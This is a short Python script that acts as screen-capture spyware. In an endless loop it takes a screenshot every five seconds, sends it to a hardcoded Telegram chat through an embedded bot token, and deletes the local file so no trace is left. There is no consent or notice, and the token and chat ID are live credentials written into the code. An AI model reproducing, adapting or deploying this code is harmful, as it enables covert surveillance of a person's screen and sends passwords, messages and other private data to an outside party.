import datetime
import os
import telebot
import pyautogui
import time

bot = telebot.TeleBot('5604810510:AAHGIsWl2qMDhy65CkX8ycWxDvcn3SODpVM')
chat_id = '673508004' 

def take_screenshot():
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    screenshot_file = f'screenshot_{timestamp}.png'
    pyautogui.screenshot(screenshot_file)
    return screenshot_file
def send_screenshot(file_path):
    with open(file_path, 'rb') as f:
        bot.send_photo(chat_id, f)
    os.remove(file_path)

def main():
    while True:
        screenshot_file = take_screenshot()
        send_screenshot(screenshot_file)
        time.sleep(5)

if __name__ == '__main__':
    main()
